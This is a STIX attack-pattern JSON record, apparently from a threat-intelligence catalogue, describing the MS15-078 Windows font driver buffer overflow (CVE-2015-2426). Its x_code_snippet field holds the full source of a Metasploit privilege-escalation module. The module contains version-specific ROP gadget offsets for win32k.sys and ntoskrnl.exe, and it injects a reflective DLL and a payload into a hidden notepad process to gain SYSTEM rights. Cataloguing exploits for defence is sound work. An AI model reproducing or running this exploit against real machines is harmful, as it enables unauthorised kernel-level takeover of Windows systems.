{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--90ab1b5c-7e7a-47c5-9e0f-b082503c9e9c",
    "created": "2024-08-14T16:49:41.092661Z",
    "modified": "2024-08-14T16:49:41.092665Z",
    "name": "MS15-078 Microsoft Windows Font Driver Buffer Overflow",
    "description": " This module exploits a pool based buffer overflow in the atmfd.dll driver when parsing a malformed font. The vulnerability was exploited by the hacking team and disclosed in the July data leak. This module has been tested successfully on vulnerable builds of Windows 8.1 x64.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ms15_078_atmfd_bof.rb",
            "external_id": "ms15_078_atmfd_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2426"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2433"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/vlad902/hacking-team-windows-kernel-lpe"
        },
        {
            "source_name": "reference",
            "url": "https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2015/september/exploiting-cve-2015-2426-and-how-i-ported-it-to-a-recent-windows-8.1-64-bit/"
        },
        {
            "source_name": "reference",
            "url": "https://code.google.com/p/google-security-research/issues/detail?id=369"
        },
        {
            "source_name": "reference",
            "url": "https://code.google.com/p/google-security-research/issues/detail?id=480"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ManualRanking\n\n  WIN32K_VERSIONS = [\n    '6.3.9600.17393',\n    '6.3.9600.17630',\n    '6.3.9600.17694',\n    '6.3.9600.17796',\n    '6.3.9600.17837',\n    '6.3.9600.17915'\n  ].freeze\n\n  NT_VERSIONS = [\n    '6.3.9600.17415',\n    '6.3.9600.17630',\n    '6.3.9600.17668',\n    '6.3.9600.17936'\n  ].freeze\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::Windows::ReflectiveDLLInjection\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'MS15-078 Microsoft Windows Font Driver Buffer Overflow',\n          'Description' => %q{\n            This module exploits a pool based buffer overflow in the atmfd.dll driver when parsing\n            a malformed font. The vulnerability was exploited by the hacking team and disclosed in\n            the July data leak. This module has been tested successfully on vulnerable builds of\n            Windows 8.1 x64.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Eugene Ching', # vulnerability discovery and exploit\n            'Mateusz Jurczyk', # vulnerability discovery\n            'Cedric Halbronn', # vulnerability and exploit analysis\n            'juan vazquez'     # msf module\n          ],\n          'Arch' => ARCH_X64,\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            [ 'Windows 8.1 x64', {} ]\n          ],\n          'Payload' => {\n            'Space' => 4096,\n            'DisableNops' => true\n          },\n          'References' => [\n            ['CVE', '2015-2426'],\n            ['CVE', '2015-2433'],\n            ['MSB', 'MS15-078'],\n            ['MSB', 'MS15-080'],\n            ['URL', 'https://github.com/vlad902/hacking-team-windows-kernel-lpe'],\n            ['URL', 'https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2015/september/exploiting-cve-2015-2426-and-how-i-ported-it-to-a-recent-windows-8.1-64-bit/'],\n            ['URL', 'https://code.google.com/p/google-security-research/issues/detail?id=369'],\n            ['URL', 'https://code.google.com/p/google-security-research/issues/detail?id=480']\n          ],\n          'DisclosureDate' => '2015-07-11',\n          'DefaultTarget' => 0,\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_sys_process_attach\n                stdapi_sys_process_execute\n                stdapi_sys_process_thread_create\n              ]\n            }\n          }\n        }\n      )\n    )\n  end\n\n  def patch_win32k_offsets(dll)\n    @win32k_offsets.each do |k, v|\n      case k\n      when 'info_leak'\n        dll.gsub!([0xdeedbeefdeedbe00].pack('Q<'), [v].pack('Q<'))\n      when 'pop_rax_ret'\n        dll.gsub!([0xdeedbeefdeedbe01].pack('Q<'), [v].pack('Q<'))\n      when 'xchg_rax_rsp'\n        dll.gsub!([0xdeedbeefdeedbe02].pack('Q<'), [v].pack('Q<'))\n      when 'allocate_pool'\n        dll.gsub!([0xdeedbeefdeedbe03].pack('Q<'), [v].pack('Q<'))\n      when 'pop_rcx_ret'\n        dll.gsub!([0xdeedbeefdeedbe04].pack('Q<'), [v].pack('Q<'))\n      when 'deref_rax_into_rcx'\n        dll.gsub!([0xdeedbeefdeedbe05].pack('Q<'), [v].pack('Q<'))\n      when 'mov_rax_into_rcx'\n        dll.gsub!([0xdeedbeefdeedbe06].pack('Q<'), [v].pack('Q<'))\n      when 'pop_rbx_ret'\n        dll.gsub!([0xdeedbeefdeedbe07].pack('Q<'), [v].pack('Q<'))\n      when 'ret'\n        dll.gsub!([0xdeedbeefdeedbe08].pack('Q<'), [v].pack('Q<'))\n      when 'mov_rax_r11_ret'\n        dll.gsub!([0xdeedbeefdeedbe09].pack('Q<'), [v].pack('Q<'))\n      when 'add_rax_rcx_ret'\n        dll.gsub!([0xdeedbeefdeedbe0a].pack('Q<'), [v].pack('Q<'))\n      when 'pop_rsp_ret'\n        dll.gsub!([0xdeedbeefdeedbe0b].pack('Q<'), [v].pack('Q<'))\n      when 'xchg_rax_rsp_adjust'\n        dll.gsub!([0xdeedbeefdeedbe0c].pack('Q<'), [v].pack('Q<'))\n      when 'chwnd_delete'\n        dll.gsub!([0xdeedbeefdeedbe0d].pack('Q<'), [v].pack('Q<'))\n      end\n    end\n  end\n\n  def set_win32k_offsets\n    @set_win32k_offsets ||= proc do |version|\n      case version\n      when '6.3.9600.17393'\n        {\n          'info_leak' => 0x3cf00,\n          'pop_rax_ret' => 0x19fab, # pop rax # ret # 58 C3\n          'xchg_rax_rsp' => 0x6121, # xchg eax, esp # ret # 94 C3\n          'allocate_pool' => 0x352220, # import entry nt!ExAllocatePoolWithTag\n          'pop_rcx_ret' => 0x98156, # pop rcx # ret # 59 C3\n          'deref_rax_into_rcx' => 0xc432f, # mov rax, [rax] # mov [rcx], rax # ret # 48 8B 00 48 89 01 C3\n          'mov_rax_into_rcx' => 0xc4332, # mov [rcx], rax # ret # 48 89 01 C3\n          'pop_rbx_ret' => 0x14db, # pop rbx # ret # 5B C3\n          'ret' => 0x6e314, # ret C3\n          'mov_rax_r11_ret' => 0x7018e,  # mov rax, r11 # ret # 49 8B C3 C3\n          'add_rax_rcx_ret' => 0xee38f,  # add rax, rcx # ret # 48 03 C1 C3\n          'pop_rsp_ret' => 0xbc8f, # pop rsp # ret # 5c c3\n          'xchg_rax_rsp_adjust' => 0x189a3a, # xchg esp, eax # sbb al, 0 # mov eax, ebx # add rsp, 20h # pop rbx # ret # 94 1C 00 8B C3 48 83 c4 20 5b c3\n          'chwnd_delete' => 0x165010 # CHwndTargetProp::Delete\n        }\n      when '6.3.9600.17630'\n        {\n          'info_leak' => 0x3d200,\n          'pop_rax_ret' => 0x19e9b, # pop rax # ret # 58 C3\n          'xchg_rax_rsp' => 0x6024, # xchg eax, esp # ret # 94 C3\n          'allocate_pool' => 0x351220, # import entry nt!ExAllocatePoolWithTag\n          'pop_rcx_ret' => 0x84f4f, # pop rcx # ret # 59 C3\n          'deref_rax_into_rcx' => 0xc3f7f, # mov rax, [rax] # mov [rcx], rax # ret # 48 8B 00 48 89 01 C3\n          'mov_rax_into_rcx' => 0xc3f82, # mov [rcx], rax # ret # 48 89 01 C3\n          'pop_rbx_ret' => 0x14db, # pop rbx # ret # 5B C3\n          'ret' => 0x14dc, # ret C3\n          'mov_rax_r11_ret' => 0x7034e,  # mov rax, r11 # ret # 49 8B C3 C3\n          'add_rax_rcx_ret' => 0xed33b,  # add rax, rcx # ret # 48 03 C1 C3\n          'pop_rsp_ret' => 0xbb93, # pop rsp # ret # 5c c3\n          'xchg_rax_rsp_adjust' => 0x17c78c, # xchg esp, eax # rol byte ptr [rcx-75h], 0c0h # add rsp, 28h # ret # 94 c0 41 8b c0 48 83 c4 28 c3\n          'chwnd_delete' => 0x146EE0 # CHwndTargetProp::Delete\n        }\n      when '6.3.9600.17694'\n        {\n          'info_leak' => 0x3d300,\n          'pop_rax_ret' => 0x151f4, # pop rax # ret # 58 C3\n          'xchg_rax_rsp' => 0x600c, # xchg eax, esp # ret # 94 C3\n          'allocate_pool' => 0x351220, # import entry nt!ExAllocatePoolWithTag\n          'pop_rcx_ret' => 0x2cf10, # pop rcx # ret # 59 C3\n          'deref_rax_into_rcx' => 0xc3757, # mov rax, [rax] # mov [rcx], rax # ret # 48 8B 00 48 89 01 C3\n          'mov_rax_into_rcx' => 0xc375a, # mov [rcx], rax # ret # 48 89 01 C3\n          'pop_rbx_ret' => 0x6682, # pop rbx # ret # 5B C3\n          'ret' => 0x6683, # ret C3\n          'mov_rax_r11_ret' => 0x7010e,  # mov rax, r11 # ret # 49 8B C3 C3\n          'add_rax_rcx_ret' => 0xecd7b,  # add rax, rcx # ret # 48 03 C1 C3\n          'pop_rsp_ret' => 0x71380, # pop rsp # ret # 5c c3\n          'xchg_rax_rsp_adjust' => 0x178c84, # xchg esp, eax # rol byte ptr [rcx-75h], 0c0h # add rsp, 28h # ret # 94 c0 41 8b c0 48 83 c4 28 c3\n          'chwnd_delete' => 0x1513D8 # CHwndTargetProp::Delete\n        }\n      when '6.3.9600.17796'\n        {\n          'info_leak' => 0x3d000,\n          'pop_rax_ret' => 0x19e4f, # pop rax # ret # 58 C3\n          'xchg_rax_rsp' => 0x5f64, # xchg eax, esp # ret # 94 C3\n          'allocate_pool' => 0x352220, # import entry nt!ExAllocatePoolWithTag\n          'pop_rcx_ret' => 0x97a5e, # pop rcx # ret # 59 C3\n          'deref_rax_into_rcx' => 0xc3aa7, # mov rax, [rax] # mov [rcx], rax # ret # 48 8B 00 48 89 01 C3\n          'mov_rax_into_rcx' => 0xc3aaa, # mov [rcx], rax # ret # 48 89 01 C3\n          'pop_rbx_ret' => 0x1B20, # pop rbx # ret # 5B C3\n          'ret' => 0x1B21, # ret C3\n          'mov_rax_r11_ret' => 0x7010e,  # mov rax, r11 # ret # 49 8B C3 C3\n          'add_rax_rcx_ret' => 0xecf8b,  # add rax, rcx # ret # 48 03 C1 C3\n          'pop_rsp_ret' => 0x29fd3, # pop rsp # ret # 5c c3\n          'xchg_rax_rsp_adjust' => 0x1789e4, # xchg esp, eax # rol byte ptr [rcx-75h], 0c0h # add rsp, 28h # ret # 94 c0 41 8b c0 48 83 c4 28 c3\n          'chwnd_delete' => 0x150F58 # CHwndTargetProp::Delete\n\n        }\n      when '6.3.9600.17837'\n        {\n          'info_leak' => 0x3d800,\n          'pop_rax_ret' => 0x1a51f, # pop rax # ret # 58 C3\n          'xchg_rax_rsp' => 0x62b4, # xchg eax, esp # ret # 94 C3\n          'allocate_pool' => 0x351220, # import entry nt!ExAllocatePoolWithTag\n          'pop_rcx_ret' => 0x97a4a, # pop rcx # ret # 59 C3\n          'deref_rax_into_rcx' => 0xc3687, # mov rax, [rax] # mov [rcx], rax # ret # 48 8B 00 48 89 01 C3\n          'mov_rax_into_rcx' => 0xc368a, # mov [rcx], rax # ret # 48 89 01 C3\n          'pop_rbx_ret' => 0x14db, # pop rbx # ret # 5B C3\n          'ret' => 0x14dc, # ret C3\n          'mov_rax_r11_ret' => 0x94871,  # mov rax, r11 # ret # 49 8B C3 C3\n          'add_rax_rcx_ret' => 0xecbdb,  # add rax, rcx # ret # 48 03 C1 C3\n          'pop_rsp_ret' => 0xbd2c, # pop rsp # ret # 5c c3\n          'xchg_rax_rsp_adjust' => 0x15e84c, # xchg esp, eax # rol byte ptr [rcx-75h], 0c0h # add rsp, 28h # ret # 94 c0 41 8b c0 48 83 c4 28 c3\n          'chwnd_delete' => 0x15A470 # CHwndTargetProp::Delete\n        }\n      when '6.3.9600.17915'\n        {\n          'info_leak' => 0x3d800,\n          'pop_rax_ret' => 0x1A4EF, # pop rax # ret # 58 C3\n          'xchg_rax_rsp' => 0x62CC, # xchg eax, esp # ret # 94 C3\n          'allocate_pool' => 0x351220, # import entry nt!ExAllocatePoolWithTag\n          'pop_rcx_ret' => 0x9765A, # pop rcx # ret # 59 C3\n          'deref_rax_into_rcx' => 0xC364F, # mov rax, [rax] # mov [rcx], rax # ret # 48 8B 00 48 89 01 C3\n          'mov_rax_into_rcx' => 0xC3652, # mov [rcx], rax # ret # 48 89 01 C3\n          'pop_rbx_ret' => 0x14DB, # pop rbx # ret # 5B C3\n          'ret' => 0x14DC, # ret # C3\n          'mov_rax_r11_ret' => 0x7060e,  # mov rax, r11 # ret # 49 8B C3 C3\n          'add_rax_rcx_ret' => 0xECDCB,  # add rax, rcx # 48 03 C1 C3\n          'pop_rsp_ret' => 0xbe33, # pop rsp # ret # 5c c3\n          'xchg_rax_rsp_adjust' => 0x15e5fc, # xchg esp, eax # rol byte ptr [rcx-75h], 0c0h # add rsp, 28h # ret # 94 c0 41 8b c0 48 83 c4 28 c3\n          'chwnd_delete' => 0x15A220 # CHwndTargetProp::Delete\n        }\n      end\n    end.call(@win32k)\n  end\n\n  def patch_nt_offsets(dll)\n    @nt_offsets.each do |k, v|\n      case k\n      when 'set_cr4'\n        dll.gsub!([0xdeedbeefdeedbe0e].pack('Q<'), [v].pack('Q<'))\n      when 'allocate_pool_with_tag'\n        dll.gsub!([0xdeedbeefdeedbe0f].pack('Q<'), [v].pack('Q<'))\n      end\n    end\n  end\n\n  def set_nt_offsets\n    @set_nt_offsets ||= proc do |version|\n      case version\n      when '6.3.9600.17415'\n        {\n          'set_cr4' => 0x38a3cc, # mov cr4, rax # add rsp, 28h # ret # 0F 22 E0 48 83 C4 28 C3\n          'allocate_pool_with_tag' => 0x2a3a50 # ExAllocatePoolWithTag\n        }\n      when '6.3.9600.17630'\n        {\n          'set_cr4' => 0x38A3BC, # mov cr4, rax # add rsp, 28h # ret # 0F 22 E0 48 83 C4 28 C3\n          'allocate_pool_with_tag' => 0x2A3A50 # ExAllocatePoolWithTag\n        }\n      when '6.3.9600.17668'\n        {\n          'set_cr4' => 0x38A3BC, # mov cr4, rax # add rsp, 28h # ret # 0F 22 E0 48 83 C4 28 C3\n          'allocate_pool_with_tag' => 0x2A3A50 # ExAllocatePoolWithTag\n        }\n      when '6.3.9600.17936'\n        {\n          'set_cr4' => 0x3863bc, # mov cr4, rax # add rsp, 28h # ret # 0F 22 E0 48 83 C4 28 C3\n          'allocate_pool_with_tag' => 0x29FA50 # ExAllocatePoolWithTag\n        }\n      end\n    end.call(@ntoskrnl)\n  end\n\n  def atmfd_version\n    file_path = expand_path('%windir%') << '\\\\system32\\\\atmfd.dll'\n    major, minor, build, revision, branch = file_version(file_path)\n    return nil if major.nil?\n\n    ver = \"#{major}.#{minor}.#{build}.#{revision}\"\n    vprint_status(\"atmfd.dll file version: #{ver} branch: #{branch}\")\n\n    ver\n  end\n\n  def win32k_version\n    file_path = expand_path('%windir%') << '\\\\system32\\\\win32k.sys'\n    major, minor, build, revision, branch = file_version(file_path)\n    return nil if major.nil?\n\n    ver = \"#{major}.#{minor}.#{build}.#{revision}\"\n    vprint_status(\"win32k.sys file version: #{ver} branch: #{branch}\")\n\n    ver\n  end\n\n  def ntoskrnl_version\n    file_path = expand_path('%windir%') << '\\\\system32\\\\ntoskrnl.exe'\n    major, minor, build, revision, branch = file_version(file_path)\n    return nil if major.nil?\n\n    ver = \"#{major}.#{minor}.#{build}.#{revision}\"\n    vprint_status(\"ntoskrnl.exe file version: #{ver} branch: #{branch}\")\n\n    ver\n  end\n\n  def check\n    # We have tested only windows 8.1\n    version = get_version_info\n    unless version.build_number != Msf::WindowsVersion::Win81 && !version.windows_server?\n      return Exploit::CheckCode::Unknown\n    end\n\n    # We have tested only 64 bits\n    if sysinfo['Architecture'] != ARCH_X64\n      return Exploit::CheckCode::Unknown\n    end\n\n    atmfd = atmfd_version\n    # atmfd 5.1.2.238 => Works\n    unless atmfd && Rex::Version.new(atmfd) <= Rex::Version.new('5.1.2.243')\n      return Exploit::CheckCode::Safe\n    end\n\n    # win32k.sys 6.3.9600.17393 => Works\n    @win32k = win32k_version\n\n    unless @win32k && WIN32K_VERSIONS.include?(@win32k)\n      return Exploit::CheckCode::Detected\n    end\n\n    # ntoskrnl.exe 6.3.9600.17415 => Works\n    @ntoskrnl = ntoskrnl_version\n\n    unless @ntoskrnl && NT_VERSIONS.include?(@ntoskrnl)\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Appears\n  end\n\n  def exploit\n    print_status('Checking target...')\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    check_result = check\n    if check_result == Exploit::CheckCode::Safe\n      fail_with(Failure::NotVulnerable, 'Target not vulnerable')\n    end\n\n    if check_result == Exploit::CheckCode::Unknown\n      fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')\n    end\n\n    if check_result == Exploit::CheckCode::Detected\n      fail_with(Failure::NotVulnerable, 'ROP chain not available for the target nt/win32k')\n    end\n\n    unless session.arch == ARCH_X64\n      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')\n    end\n\n    print_status(\"Exploiting with win32k #{@win32k} and nt #{@ntoskrnl}...\")\n\n    set_win32k_offsets\n    fail_with(Failure::NoTarget, 'win32k.sys offsets not available') if @win32k_offsets.nil?\n\n    set_nt_offsets\n    fail_with(Failure::NoTarget, 'ntoskrnl.exe offsets not available') if @nt_offsets.nil?\n\n    begin\n      print_status('Launching notepad to host the exploit...')\n      notepad_process = client.sys.process.execute('notepad.exe', nil, { 'Hidden' => true })\n      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)\n      print_good(\"Process #{process.pid} launched.\")\n    rescue Rex::Post::Meterpreter::RequestError\n      # Sandboxes could not allow to create a new process\n      # stdapi_sys_process_execute: Operation failed: Access is denied.\n      print_error('Operation failed. Trying to elevate the current process...')\n      process = client.sys.process.open\n    end\n\n    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-2426', 'reflective_dll.x64.dll')\n    library_path = ::File.expand_path(library_path)\n\n    print_status(\"Reflectively injecting the exploit DLL into #{process.pid}...\")\n    encrypted_dll = ::File.binread(library_path)\n    dll = ::MetasploitPayloads::Crypto.decrypt(ciphertext: encrypted_dll)\n\n    patch_win32k_offsets(dll)\n    patch_nt_offsets(dll)\n\n    exploit_mem, offset = inject_dll_data_into_process(process, dll)\n\n    print_status(\"Exploit injected. Injecting payload into #{process.pid}...\")\n    payload_mem = inject_into_process(process, payload.encoded)\n\n    # invoke the exploit, passing in the address of the payload that\n    # we want invoked on successful exploitation.\n    print_status('Payload injected. Executing exploit...')\n    process.thread.create(exploit_mem + offset, payload_mem)\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-07-11",
    "x_mitre_platforms": [
        "win'"
    ]
}